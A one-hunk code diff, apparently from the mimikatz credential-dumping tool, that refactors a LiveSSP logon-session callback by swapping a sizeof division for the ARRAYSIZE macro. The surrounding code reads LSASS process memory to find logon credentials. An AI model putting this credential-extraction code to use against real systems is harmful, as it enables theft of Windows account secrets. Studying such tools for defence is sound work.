@@ -33,7 +33,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_livessp(IN PKIWI_BASIC_SECURIT
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {&credentials, &hLocalMemory}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	
-	if(kuhl_m_sekurlsa_livessp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_livessp_package.Module, LiveReferences, sizeof(LiveReferences) / sizeof(KULL_M_PATCH_GENERIC), (PVOID *) &LiveGlobalLogonSessionList, NULL, NULL))
+	if(kuhl_m_sekurlsa_livessp_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_livessp_package.Module, LiveReferences, ARRAYSIZE(LiveReferences), (PVOID *) &LiveGlobalLogonSessionList, NULL, NULL))
 	{
 		aLsassMemory.address = LiveGlobalLogonSessionList;
 		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_LIVESSP_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
